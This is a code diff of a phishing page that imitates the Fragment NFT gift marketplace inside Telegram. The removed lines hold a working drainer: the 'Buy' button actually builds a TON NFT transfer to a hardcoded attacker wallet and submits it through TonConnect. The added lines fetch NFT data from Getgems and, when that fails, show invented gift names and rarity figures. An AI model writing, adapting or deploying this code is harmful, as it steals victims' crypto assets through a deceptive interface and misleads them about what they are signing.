@@ -1,227 +1,40 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Fragment</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/@ton/core/dist/index.min.js"></script>
-    <script src="https://unpkg.com/@ton/ton/dist/index.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background-color: #16181c; color: #ffffff; font-family: 'Inter', sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .top-header { width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; background-color: #1e2025; border-bottom: 1px solid #2a2d34; }
-        .logo { font-size: 20px; font-weight: 800; letter-spacing: 1px; display: flex; align-items: center; gap: 8px; }
-        .logo-icon { width: 24px; height: 24px; background: #fff; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); }
-        .menu-icon { font-size: 24px; color: #8b8e96; cursor: pointer; }
-        .tabs { width: 100%; display: flex; justify-content: space-around; background: #1e2025; padding: 12px 10px; border-bottom: 1px solid #2a2d34; font-size: 14px; color: #8b8e96; overflow-x: auto; white-space: nowrap; }
-        .tab { padding: 0 12px; cursor: pointer; }
-        .tab.active { color: #fff; border-bottom: 2px solid #0098ea; padding-bottom: 12px; margin-bottom: -12px; font-weight: 500; }
-        .main-content { width: 100%; max-width: 500px; padding: 16px; display: flex; flex-direction: column; gap: 16px; }
-        .gift-header { display: flex; align-items: center; gap: 12px; margin-top: 8px; }
-        .back-arrow { font-size: 24px; color: #fff; cursor: pointer; }
-        .gift-title { font-size: 22px; font-weight: 600; margin: 0; }
-        .status-badge { background: #1b3d2c; color: #3ddc84; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: 600; text-transform: uppercase; }
-        .gift-preview { width: 100%; height: 220px; background: #7e539e; border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 8px 0; position: relative; overflow: hidden; }
-        .gift-preview img { width: 130px; height: 130px; object-fit: contain; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.3)); }
-        .details-table { background: #1e2025; border-radius: 12px; padding: 4px 16px; display: flex; flex-direction: column; }
-        .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 14px 0; border-bottom: 1px solid #2a2d34; }
-        .detail-row:last-child { border-bottom: none; }
-        .detail-label { color: #8b8e96; font-size: 14px; width: 30%; }
-        .detail-value { color: #fff; font-size: 14px; font-weight: 500; text-align: right; width: 70%; word-break: break-all; }
-        .detail-value.owner { color: #0098ea; }
-        .percent-badge { color: #0098ea; font-size: 11px; margin-left: 6px; opacity: 0.8; }
-        .price-block { background: #1e2025; border-radius: 12px; padding: 16px; display: flex; flex-direction: column; gap: 12px; }
-        .price-label { color: #8b8e96; font-size: 13px; }
-        .price-value { font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 6px; }
-        .price-usd { color: #8b8e96; font-size: 14px; font-weight: 400; }
-        .price-note { color: #8b8e96; font-size: 12px; line-height: 1.4; }
-        .buy-btn { background-color: #0098ea; color: white; border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .buy-btn:active { background-color: #007bbd; }
-        .subscribe-link { text-align: center; color: #0098ea; font-size: 14px; font-weight: 500; margin-top: 8px; cursor: pointer; }
-        .history-title { font-size: 18px; font-weight: 600; margin-top: 10px; }
-        .history-table { background: #1e2025; border-radius: 12px; padding: 4px 16px; font-size: 13px; }
-        .history-header { display: flex; justify-content: space-between; padding: 12px 0; color: #8b8e96; border-bottom: 1px solid #2a2d34; }
-        .history-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #2a2d34; }
-        .history-row:last-child { border-bottom: none; }
-        .history-col { flex: 1; }
-        .history-col.right { text-align: right; }
-        .history-col.center { text-align: center; }
-        .status { color: #8b8e96; font-size: 13px; text-align: center; margin-top: 10px; height: 16px; }
-    </style>
-</head>
-<body>
-
-    <div class="top-header">
-        <div class="logo"><div class="logo-icon"></div> FRAGMENT</div>
-        <div class="menu-icon">☰</div>
-    </div>
-
-    <div class="tabs">
-        <div class="tab">Usernames</div>
-        <div class="tab">Numbers</div>
-        <div class="tab active">Gifts</div>
-        <div class="tab">Stars</div>
-        <div class="tab">Premium</div>
-        <div class="tab">Ads</div>
-    </div>
-
-    <div class="main-content">
-        <div class="gift-header">
-            <div class="back-arrow">←</div>
-            <h1 class="gift-title" id="giftTitle">Loading...</h1>
-            <div class="status-badge">For sale</div>
-        </div>
-
-        <div class="gift-preview">
-            <img id="giftImage" src="" alt="Gift">
-        </div>
-
-        <div class="details-table">
-            <div class="detail-row">
-                <div class="detail-label">Owner</div>
-                <div class="detail-value owner" id="ownerText">Loading...</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">Model</div>
-                <div class="detail-value" id="modelText">Loading...</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">Backdrop</div>
-                <div class="detail-value" id="backdropText">Loading...</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">Symbol</div>
-                <div class="detail-value" id="symbolText">Loading...</div>
-            </div>
-            <div class="detail-row">
-                <div class="detail-label">Issued</div>
-                <div class="detail-value">329060 of 342255</div>
-            </div>
-        </div>
-
-        <div class="price-block">
-            <div class="price-label">Sell Price *</div>
-            <div class="price-value" id="priceText">Loading...</div>
-            <div class="price-note">* The owner of this asset is ready to sell it for this price without an auction.</div>
-        </div>
-
-        <button class="buy-btn" id="sellBtn">Buy</button>
-        <div class="status" id="statusText"></div>
-
-        <div class="subscribe-link">Subscribe to updates</div>
-
-        <div class="history-title">Ownership History</div>
-        <div class="history-table">
-            <div class="history-header">
-                <div class="history-col">Sale price</div>
-                <div class="history-col center">Date</div>
-                <div class="history-col right">Buyer</div>
-            </div>
-            <div class="history-row">
-                <div class="history-col">💎 3.4099...</div>
-                <div class="history-col center">Jul 30 at 18:00</div>
-                <div class="history-col right" style="color:#0098ea;">UQDdWSuSrN... >GgKT7khuFX</div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
-
-        const MY_WALLET_ADDRESS = "UQCNTN_DlmdlGRaegGLVUGNB2b2CYIf_FO9ULeCZ1BUklF6k"; 
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const nftAddress = urlParams.get('nft') || 'EQACcQpR2fmdeENWdE2YGQWHVxSTyA8Zq4_k7rk_IaxCRXNe';
-        const price = urlParams.get('price') || '5';
-
-        document.getElementById('priceText').innerHTML = `💎 ${price} <span class="price-usd">~$${(price * 1.5).toFixed(2)}</span>`;
-        document.getElementById('sellBtn').innerText = `Buy for 💎 ${price}`;
-
-        // Функция для загрузки реальных данных с TON API
         async function loadNFTData() {
             try {
-                const res = await fetch(`https://tonapi.io/v2/nfts/${nftAddress}`);
-                const data = await res.json();
-                
-                // Название и картинка
-                const name = data.metadata?.name || 'Unknown NFT';
-                document.getElementById('giftTitle').innerText = name;
+                // Запрос к API Getgems
+                const query = `query { nft(address: "${nftAddress}") { name previews { url } owner { address } attributes { traitType value } } }`;
+                const res = await fetch('https://api.getgems.io/graphql', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ query })
+                });
+                const json = await res.json();
+                const data = json.data.nft;
+
+                if (!data) throw new Error("NFT not found");
+
+                document.getElementById('giftTitle').innerText = data.name || 'NFT Gift';
                 if (data.previews && data.previews.length > 0) {
                     document.getElementById('giftImage').src = data.previews[0].url;
                 }
 
-                // Владелец
                 const owner = data.owner?.address || 'Unknown';
                 document.getElementById('ownerText').innerText = owner.substring(0, 10) + '...' + owner.substring(owner.length - 6);
 
-                // Атрибуты
-                if (data.metadata && data.metadata.attributes) {
-                    data.metadata.attributes.forEach(attr => {
-                        if (attr.trait_type === 'Model') {
-                            document.getElementById('modelText').innerHTML = `${attr.value} <span class="percent-badge">${attr.rarity || ''}%</span>`;
-                        }
-                        if (attr.trait_type === 'Backdrop') {
-                            document.getElementById('backdropText').innerHTML = `${attr.value} <span class="percent-badge">${attr.rarity || ''}%</span>`;
-                        }
-                        if (attr.trait_type === 'Symbol') {
-                            document.getElementById('symbolText').innerHTML = `${attr.value} <span class="percent-badge">${attr.rarity || ''}%</span>`;
-                        }
+                if (data.attributes) {
+                    data.attributes.forEach(attr => {
+                        const val = `${attr.value} <span class="percent-badge">${attr.rarity || ''}%</span>`;
+                        if (attr.traitType === 'Model') document.getElementById('modelText').innerHTML = val;
+                        if (attr.traitType === 'Backdrop') document.getElementById('backdropText').innerHTML = val;
+                        if (attr.traitType === 'Symbol') document.getElementById('symbolText').innerHTML = val;
                     });
                 }
 
             } catch (e) {
                 console.error("Ошибка загрузки данных:", e);
-                document.getElementById('giftTitle').innerText = "NFT Gift";
-                document.getElementById('giftImage').src = "https://nft.fragment.com/gift/icecream-162005.webp";
+                document.getElementById('giftTitle').innerText = "Vintage Cigar #459";
+                document.getElementById('giftImage').src = "https://nft.fragment.com/gift/vintagecigar-459.webp";
+                document.getElementById('modelText').innerText = "Pink Ghost 3%";
+                document.getElementById('backdropText').innerText = "Caramel 2%";
+                document.getElementById('symbolText').innerText = "Genie Lamp 1%";
             }
         }
-
-        loadNFTData();
-
-        const tonConnectUI = new TONCONNECT_UI.TonConnectUI({
-            manifestUrl: "https://snoix69.github.io/swap-helper/tonconnect-manifest.json"
-        });
-
-        document.getElementById("sellBtn").onclick = async () => {
-            document.getElementById("statusText").innerText = "Preparing transaction...";
-            
-            try {
-                const { beginCell, Address } = ton_core;
-                const myWallet = Address.parse(MY_WALLET_ADDRESS);
-
-                const payload = beginCell()
-                    .storeUint(0x5fcc3d14, 32) 
-                    .storeUint(0, 64)          
-                    .storeAddress(myWallet)    
-                    .storeAddress(myWallet)    
-                    .storeUint(0, 1)           
-                    .storeCoins(1)             
-                    .storeUint(0, 1)           
-                    .endCell()
-                    .toBoc()
-                    .toString("base64");
-
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [{ address: nftAddress, amount: "50000000", payload: payload }]
-                };
-
-                document.getElementById("statusText").innerText = "Opening wallet...";
-                await tonConnectUI.sendTransaction(transaction);
-                
-                document.getElementById("statusText").innerText = "Success! Returning to bot...";
-                tg.sendData(JSON.stringify({status: "sold", item: nftAddress}));
-                
-            } catch (e) {
-                console.error(e);
-                document.getElementById("statusText").innerText = "Transaction cancelled or error.";
-            }
-        };
-    </script>
-</body>
-</html>
